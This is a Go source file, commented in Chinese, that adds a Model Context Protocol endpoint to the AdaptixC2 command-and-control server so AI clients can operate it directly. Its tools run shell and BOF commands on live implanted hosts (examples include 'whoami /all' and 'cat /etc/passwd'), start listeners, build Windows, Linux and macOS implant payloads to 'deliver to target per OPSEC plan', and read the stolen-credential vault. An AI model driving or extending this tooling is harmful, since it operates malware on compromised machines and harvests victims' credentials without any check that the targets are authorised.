package connector

/* ────────────────────────────────────────────────────────────────────────
   MCP (Model Context Protocol) endpoint — Streamable HTTP, stateless.

   2026-11-09: 把 C2 的核心操作暴露给 AI 客户端（Claude / Cursor / Cline …）。
   走团队服务端现有的 HTTPS 端口（默认 8080），路径 {Endpoint}/mcp，
   与 REST API 同一套 Bearer JWT 认证（先 POST {Endpoint}/login 拿 token，
   MCP 客户端配 Authorization header）。

   协议版本：MCP 2025-06-18（Streamable HTTP）。
   实现是**无状态服务器**（spec 允许的简化形态）：
     POST {Endpoint}/mcp  JSON-RPC 2.0 单请求单响应
     GET  / DELETE        405（不提供 SSE 推送流，无会话可删）
   客户端 initialize 带 protocolVersion 时原样回显（认识的才回自己的），
   不认识回 "2025-06-18" —— 与 spec 的版本协商一致。

   JSON-RPC 里 notifications（无 id）回 202 空 body，请求一律 200 + JSON。
   ──────────────────────────────────────────────────────────────────────── */

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/http"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

const mcpProtocolVersion = "2025-06-18"

/* ── wire 类型 ─────────────────────────────────────────────────────────── */

type mcpRequest struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

type mcpTool struct {
	Name        string         `json:"name"`
	Title       string         `json:"title,omitempty"`
	Description string         `json:"description"`
	InputSchema map[string]any `json:"inputSchema"`
}

type mcpTextContent struct {
	Type string `json:"type"`
	Text string `json:"text"`
}

/* ── HTTP handlers ─────────────────────────────────────────────────────── */

// TcMcpPost — POST {Endpoint}/mcp，唯一有语义的方法。
func (tc *TsConnector) TcMcpPost(ctx *gin.Context) {
	var req mcpRequest
	if err := ctx.ShouldBindJSON(&req); err != nil {
		mcpWriteJSONRPC(ctx, nil, nil, mcpErr(-32700, "parse error: "+err.Error()))
		return
	}

	// notifications（无 id）：202 + 空 body（Streamable HTTP 规定）
	if len(req.ID) == 0 {
		ctx.Status(http.StatusAccepted)
		return
	}

	switch req.Method {
	case "initialize":
		mcpWriteJSONRPC(ctx, req.ID, gin.H{
			"protocolVersion": mcpNegotiateVersion(req.Params),
			"capabilities": gin.H{
				"tools": gin.H{"listChanged": false},
			},
			"serverInfo": gin.H{
				"name":    "adaptixc2",
				"version": "2.0",
			},
			"instructions": "AdaptixC2 teamserver. Tools operate on live implant sessions: list hosts with list_agents, run shell/BOF commands per host with agent_command, poll results with agent_tasks. Commands are queued and picked up on each host's next check-in (sleep), so results may take seconds to minutes.",
		}, nil)

	case "ping":
		mcpWriteJSONRPC(ctx, req.ID, gin.H{}, nil)

	case "tools/list":
		tools := append(mcpTools(), mcpToolsExtra()...)
		mcpWriteJSONRPC(ctx, req.ID, gin.H{"tools": tools}, nil)

	case "tools/call":
		tc.mcpToolsCall(ctx, req)

	default:
		mcpWriteJSONRPC(ctx, req.ID, nil, mcpErr(-32601, "method not found: "+req.Method))
	}
}

// TcMcpGet — 不提供 SSE 推送流：405（spec 允许无状态服务器不实现 GET）。
func (tc *TsConnector) TcMcpGet(ctx *gin.Context) {
	ctx.Status(http.StatusMethodNotAllowed)
}

/* ── JSON-RPC 帮手 ─────────────────────────────────────────────────────── */

type mcpErrorObj struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

func mcpErr(code int, msg string) *mcpErrorObj { return &mcpErrorObj{Code: code, Message: msg} }

func mcpWriteJSONRPC(ctx *gin.Context, id json.RawMessage, result any, rpcErr *mcpErrorObj) {
	resp := map[string]any{"jsonrpc": "2.0"}
	if id != nil {
		resp["id"] = id
	}
	if rpcErr != nil {
		resp["error"] = rpcErr
	} else {
		resp["result"] = result
	}
	ctx.JSON(http.StatusOK, resp)
}

func mcpNegotiateVersion(params json.RawMessage) string {
	var p struct {
		ProtocolVersion string `json:"protocolVersion"`
	}
	if len(params) > 0 && json.Unmarshal(params, &p) == nil && p.ProtocolVersion != "" {
		// 回显客户端版本是 spec 认可的协商结果（服务器接受该版本）。
		// 只认 2025-03-26 / 2025-06-18 两代 Streamable 家族；更老的不认。
		if p.ProtocolVersion == "2025-03-26" || p.ProtocolVersion == "2025-06-18" {
			return p.ProtocolVersion
		}
	}
	return mcpProtocolVersion
}

/* ── tool 实现帮助函数 ─────────────────────────────────────────────────── */

func mcpParseParams(params json.RawMessage, out any) *mcpErrorObj {
	if len(params) == 0 {
		return nil // 无参数调用，out 保持零值
	}
	if err := json.Unmarshal(params, out); err != nil {
		return mcpErr(-32602, "invalid params: "+err.Error())
	}
	return nil
}

func mcpStr(schema map[string]any) map[string]any {
	schema["type"] = "object"
	schema["additionalProperties"] = false
	return schema
}

func mcpProp(schema map[string]any, name, typ, desc string, required bool) {
	props, _ := schema["properties"].(map[string]any)
	if props == nil {
		props = map[string]any{}
		schema["properties"] = props
	}
	props[name] = map[string]any{"type": typ, "description": desc}
	if required {
		req, _ := schema["required"].([]string)
		schema["required"] = append(req, name)
	}
}

/* ── tool 清单 ─────────────────────────────────────────────────────────── */

func mcpTools() []mcpTool {
	return []mcpTool{
		{
			Name:        "server_status",
			Title:       "C2 overview",
			Description: "Teamserver overview: agent (host) counts, online counts and listener counts. Start here.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:        "list_agents",
			Title:       "List implant hosts",
			Description: "All implant sessions (hosts): id, computer, user, IPs, OS, listener, tags, last check-in. a_os: 0=unknown 1=Windows 2=Linux 3=macOS.",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "get_agent",
			Title: "Get one host",
			Description: "One implant session by id (8-32 hex). Returns the same record set as list_agents, filtered.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Agent/session id (hex)", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "agent_command",
			Title: "Run command on host",
			Description: "Queue a console command on a host (same parser as the web console 'raw' endpoint): whoami, shell id, execute bof <server .o path> -a, sleep 0, ... Output is async — poll agent_tasks. Windows beacon examples: whoami /all, shell dir, screenshot_bof. Linux agent examples: getuid, shell id, cat /etc/passwd.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Target host id", true)
				mcpProp(s, "cmdline", "string", "Command line, e.g. 'whoami' or 'shell id'", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "agent_tasks",
			Title: "Poll task results",
			Description: "Completed task records for a host (command output lives in a_text). Poll this after agent_command; empty means not finished yet.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent_id", "string", "Host id", true)
				mcpProp(s, "limit", "integer", "Max records (default 20)", false)
				return mcpStr(s)
			}(),
		},
		{
			Name:        "list_listeners",
			Title:       "List listeners",
			Description: "All listeners: name, type, protocol, bind host/port, status (Listen = running).",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "listener_create",
			Title: "Create listener",
			Description: "Create + start a listener. config_type is the registered type (BeaconHTTP, BeaconWS, BeaconHTTPS, BeaconTCP, BeaconSMB, GopherTCP, LinuxTCP, KharonHTTP ...). config is the listener JSON (same shape the web console sends; see list_listeners for examples) — key fields: host_bind, port_bind, callback_addresses, encrypt_key (32 hex), uri/user_agent for HTTP-like types. Destroyed on error.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "name", "string", "Listener name", true)
				mcpProp(s, "config_type", "string", "Registered type, e.g. BeaconHTTP", true)
				mcpProp(s, "config", "string", "Listener config JSON string", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "listener_stop",
			Title: "Stop listener",
			Description: "Stop a running listener by name. config_type must match (see list_listeners). Issued agents keep running but can no longer check in.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "name", "string", "Listener name", true)
				mcpProp(s, "config_type", "string", "Registered type", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:  "generate_payload",
			Title: "Generate implant payload",
			Description: "Generate an implant build (agent + listener + config). Returns filename and base64 content. agent: beacon (Windows exe/dll), linux (ELF/SO), gopher, macos, kharon. config is the build JSON (e.g. {\"os\":\"windows\",\"arch\":\"x64\",\"format\":\"Exe\",\"sleep\":\"5s\",\"jitter\":10}); use build_schema for the exact fields per agent.",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "agent", "string", "Agent name (beacon/linux/gopher/macos/kharon)", true)
				mcpProp(s, "listener_name", "string", "Listener to bind (must be running)", true)
				mcpProp(s, "config", "string", "Build config JSON string", true)
				return mcpStr(s)
			}(),
		},
		{
			Name:        "credentials_list",
			Title:       "List credentials",
			Description: "Team credential vault (username/password/realm/host/tag).",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:        "targets_list",
			Title:       "List targets",
			Description: "Target asset registry (computer/domain/address/tag/note).",
			InputSchema: mcpStr(map[string]any{}),
		},
		{
			Name:  "chat_send",
			Title: "Team chat",
			Description: "Send a message to the operator team chat (broadcast to all online consoles).",
			InputSchema: func() map[string]any {
				s := map[string]any{}
				mcpProp(s, "message", "string", "Message text", true)
				return mcpStr(s)
			}(),
		},
	}
}

/* ── tools/call 分发 ───────────────────────────────────────────────────── */

type mcpCallResult struct {
	Content []mcpTextContent `json:"content"`
	IsError bool             `json:"isError,omitempty"`
}

func (tc *TsConnector) mcpToolsCall(ctx *gin.Context, req mcpRequest) {
	var p struct {
		Name      string          `json:"name"`
		Arguments json.RawMessage `json:"arguments,omitempty"`
	}
	if e := mcpParseParams(req.Params, &p); e != nil {
		mcpWriteJSONRPC(ctx, req.ID, nil, e)
		return
	}

	username := ctx.GetString("username")
	if username == "" {
		if v, ok := ctx.Get("username"); ok {
			if s, ok2 := v.(string); ok2 {
				username = s
			}
		}
	}
	if username == "" {
		username = "mcp"
	}

	var text string
	var callErr error

	switch p.Name {
	case "server_status":
		text, callErr = tc.mcpServerStatus()
	case "list_agents":
		payload, err := tc.teamserver.TsAgentList()
		text, callErr = tc.mcpPassThrough("agents", payload, err)
	case "get_agent":
		text, callErr = tc.mcpGetAgent(p.Arguments)
	case "agent_command":
		text, callErr = tc.mcpAgentCommand(p.Arguments, username)
	case "agent_tasks":
		text, callErr = tc.mcpAgentTasks(p.Arguments)
	case "list_listeners":
		payload, err := tc.teamserver.TsListenerList()
		text, callErr = tc.mcpPassThrough("listeners", payload, err)
	case "listener_create":
		text, callErr = tc.mcpListenerCreate(p.Arguments)
	case "listener_stop":
		text, callErr = tc.mcpListenerStop(p.Arguments)
	case "generate_payload":
		text, callErr = tc.mcpGeneratePayload(p.Arguments)
	case "credentials_list":
		payload, err := tc.teamserver.TsCredentilsList()
		text, callErr = tc.mcpPassThrough("credentials", payload, err)
	case "targets_list":
		payload, err := tc.teamserver.TsTargetsList()
		text, callErr = tc.mcpPassThrough("targets", payload, err)
	case "chat_send":
		text, callErr = tc.mcpChatSend(p.Arguments, username)
	default:
		// 第二批（mcp_extra.go）：命中返回 (text, err, true)
		if extraText, extraErr, handled := tc.mcpToolsCallExtra(ctx, p.Name, p.Arguments, username); handled {
			res := mcpCallResult{Content: []mcpTextContent{{Type: "text", Text: extraText}}}
			if extraErr != nil {
				res.IsError = true
				res.Content[0].Text = extraErr.Error()
			}
			mcpWriteJSONRPC(ctx, req.ID, res, nil)
			return
		}
		mcpWriteJSONRPC(ctx, req.ID, nil, mcpErr(-32602, "unknown tool: "+p.Name))
		return
	}

	res := mcpCallResult{Content: []mcpTextContent{{Type: "text", Text: text}}}
	if callErr != nil {
		res.IsError = true
		res.Content[0].Text = callErr.Error()
	}
	mcpWriteJSONRPC(ctx, req.ID, res, nil)
}

/* ── 各 tool 实现 ─────────────────────────────────────────────────────── */

// mcpPassThrough — teamserver 的 list 接口本来就返回 JSON 字符串，直接透传。
func (tc *TsConnector) mcpPassThrough(name string, payload string, err error) (string, error) {
	if err != nil {
		return "", errors.New(name + ": " + err.Error())
	}
	return payload, nil
}

func (tc *TsConnector) mcpServerStatus() (string, error) {
	agentsJSON, err := tc.teamserver.TsAgentList()
	if err != nil {
		return "", errors.New("agents: " + err.Error())
	}
	var agents []map[string]any
	_ = json.Unmarshal([]byte(agentsJSON), &agents)

	online := 0
	for _, a := range agents {
		if t, _ := a["a_last_tick"].(float64); t > 0 {
			if time.Now().Unix()-int64(t) < 60 {
				online++
			}
		}
	}

	listenersJSON, err := tc.teamserver.TsListenerList()
	if err != nil {
		return "", errors.New("listeners: " + err.Error())
	}
	var listeners []map[string]any
	_ = json.Unmarshal([]byte(listenersJSON), &listeners)

	out, _ := json.MarshalIndent(map[string]any{
		"agents_total":  len(agents),
		"agents_online": online,
		"listeners":     len(listeners),
		"time":          time.Now().UTC().Format(time.RFC3339),
	}, "", "  ")
	return string(out), nil
}

func (tc *TsConnector) mcpGetAgent(args json.RawMessage) (string, error) {
	var a struct {
		AgentID string `json:"agent_id"`
	}
	if e := mcpParseParams(args, &a); e != nil {
		return "", errors.New(e.Message)
	}
	if a.AgentID == "" {
		return "", errors.New("agent_id is required")
	}
	agentsJSON, err := tc.teamserver.TsAgentList()
	if err != nil {
		return "", errors.New("agents: " + err.Error())
	}
	var agents []map[string]any
	_ = json.Unmarshal([]byte(agentsJSON), &agents)
	for _, ag := range agents {
		if id, _ := ag["a_id"].(string); id == a.AgentID {
			out, _ := json.MarshalIndent(ag, "", "  ")
			return string(out), nil
		}
	}
	return "", errors.New("agent not found: " + a.AgentID)
}

func (tc *TsConnector) mcpAgentCommand(args json.RawMessage, username string) (string, error) {
	var p struct {
		AgentID string `json:"agent_id"`
		Cmdline string `json:"cmdline"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.AgentID == "" || p.Cmdline == "" {
		return "", errors.New("agent_id and cmdline are required")
	}
	text, err, _ := tc.mcpQueueCommand(p.AgentID, username, p.Cmdline)
	return text, err
}

func (tc *TsConnector) mcpAgentTasks(args json.RawMessage) (string, error) {
	var p struct {
		AgentID string `json:"agent_id"`
		Limit   int    `json:"limit"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.AgentID == "" {
		return "", errors.New("agent_id is required")
	}
	if p.Limit <= 0 || p.Limit > 200 {
		p.Limit = 20
	}
	data, err := tc.teamserver.TsTaskListCompleted(p.AgentID, p.Limit, 0)
	if err != nil {
		return "", errors.New("tasks: " + err.Error())
	}
	return string(data), nil
}

func (tc *TsConnector) mcpListenerCreate(args json.RawMessage) (string, error) {
	var p struct {
		Name       string `json:"name"`
		ConfigType string `json:"config_type"`
		Config     string `json:"config"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.Name == "" || p.ConfigType == "" || p.Config == "" {
		return "", errors.New("name, config_type and config are required")
	}
	if err := tc.teamserver.TsListenerStart(p.Name, p.ConfigType, p.Config, 0, "", nil); err != nil {
		return "", errors.New("listener start failed: " + err.Error())
	}
	return "listener started: " + p.Name + " (" + p.ConfigType + ")", nil
}

func (tc *TsConnector) mcpListenerStop(args json.RawMessage) (string, error) {
	var p struct {
		Name       string `json:"name"`
		ConfigType string `json:"config_type"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.Name == "" || p.ConfigType == "" {
		return "", errors.New("name and config_type are required")
	}
	if err := tc.teamserver.TsListenerStop(p.Name, p.ConfigType); err != nil {
		return "", errors.New("listener stop failed: " + err.Error())
	}
	return "listener stopped: " + p.Name, nil
}

func (tc *TsConnector) mcpGeneratePayload(args json.RawMessage) (string, error) {
	var p struct {
		Agent         string   `json:"agent"`
		ListenerNames []string `json:"listener_name"`
		Config        string   `json:"config"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.Agent == "" || len(p.ListenerNames) == 0 || p.Config == "" {
		return "", errors.New("agent, listener_name and config are required")
	}
	content, fileName, err := tc.teamserver.TsAgentBuildSyncOnce(p.Agent, p.Config, p.ListenerNames)
	if err != nil {
		return "", errors.New("generate failed: " + err.Error())
	}
	out, _ := json.Marshal(map[string]string{
		"filename":     fileName,
		"size":         strconv.Itoa(len(content)),
		"base64":       base64.StdEncoding.EncodeToString(content),
		"note":         "save bytes locally; deliver to target per OPSEC plan",
	})
	return string(out), nil
}

func (tc *TsConnector) mcpChatSend(args json.RawMessage, username string) (string, error) {
	var p struct {
		Message string `json:"message"`
	}
	if e := mcpParseParams(args, &p); e != nil {
		return "", errors.New(e.Message)
	}
	if p.Message == "" {
		return "", errors.New("message is required")
	}
	tc.teamserver.TsChatSendMessage(username, p.Message)
	return "sent", nil
}
